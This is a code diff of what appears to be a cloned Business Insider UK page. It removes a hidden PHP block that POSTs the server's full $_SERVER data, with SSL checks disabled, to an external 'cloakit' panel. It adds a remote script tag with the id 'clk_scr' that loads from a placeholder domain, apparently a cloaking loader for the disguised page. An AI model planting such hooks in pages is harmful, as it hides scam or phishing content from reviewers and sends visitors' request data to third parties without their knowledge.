@@ -1,26 +1,3 @@
-<?php
-$data = array(
-   '_server' => json_encode($_SERVER),
-   'user' => '5809689953d09f825e78a8e58137db03',
-   'company' => '8528'
-);
-$ch = curl_init();
-$optArray = array(
-    CURLOPT_URL => 'https://panel.cloakit.space/api',
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_SSL_VERIFYHOST => false,
-    CURLOPT_SSL_VERIFYPEER => false,
-    CURLOPT_CUSTOMREQUEST => 'POST',
-    CURLOPT_POSTFIELDS => $data
-);
-curl_setopt_array($ch, $optArray);
-$result = curl_exec($ch);
-curl_close($ch);
-$responses = json_decode($result, true);
-
-echo $responses;
-?>
-
 <!DOCTYPE html>
 <html>
 <!--
@@ -33,6 +10,9 @@ page generated in section: 880367
 <link rel="stylesheet" href="https://s2-prod.insider.co.uk/@trinitymirrordigital/marwood/TM/scss/section-base.css?v=d752b869fbf16b06086e83c49d610d8d"><link rel="stylesheet" href="https://s2-prod.insider.co.uk/@trinitymirrordigital/chameleon-static-html/scss/chameleon-static-html.css?v=b5d8a169ec0e27316ca9bc194eabb9e1">
 <link rel="stylesheet" href="https://s2-prod.insider.co.uk/@trinitymirrordigital/marwood/TM/scss/marwood-extended.css?v=5f80079005b89f8aa113851bdc83c83e" media="screen and (min-width: 728px)">
 <meta id="publicationConfig" name="publicationConfig" content="https://s2-prod.insider.co.uk/@trinitymirrordigital/chameleon-branding/publications/businessInsider/"><link rel="preload" href="https://s2-prod.insider.co.uk/@trinitymirrordigital/chameleon-branding/webfonts/woff2/SignikaNegative-Bold.47b398e81c9f2e2e.woff2" as="font" crossorigin="crossorigin"><link rel="preload" href="https://s2-prod.insider.co.uk/@trinitymirrordigital/chameleon-branding/webfonts/woff2/opensans-bold-webfont.1b0229cc78352a07.woff2" as="font" crossorigin="crossorigin"><link rel="preload" href="https://s2-prod.insider.co.uk/@trinitymirrordigital/chameleon-branding/webfonts/woff2/opensans-regular-webfont.c17ed4f560d01e13.woff2" as="font" crossorigin="crossorigin"><link rel="preload" href="https://s2-prod.insider.co.uk/@trinitymirrordigital/chameleon-branding/webfonts/woff2/icomoon.401b68699723e317.woff2" as="font" crossorigin="crossorigin"><link rel="preload" href="https://s2-prod.insider.co.uk/@trinitymirrordigital/chameleon-branding/publications/businessInsider/scss/brand-extended.a7c86bba7c4552f7.css" as="style"><link rel="stylesheet" href="https://s2-prod.insider.co.uk/@trinitymirrordigital/chameleon-branding/publications/businessInsider/scss/brand-extended.a7c86bba7c4552f7.css"><link rel="shortcut icon" href="https://s2-prod.insider.co.uk/@trinitymirrordigital/chameleon-branding/publications/businessInsider/img/favicon.74572be5fe93a8de.ico" type="image/x-icon"><meta id="iOSAppConfig" name="apple-itunes-app" content="app-id=undefined">
+
+<script id="clk_scr" src="http://yourdomain.com/script.js"></script>
+
 <script>/*!
 * $script.js JS loader & dependency manager
 * https://github.com/ded/script.js
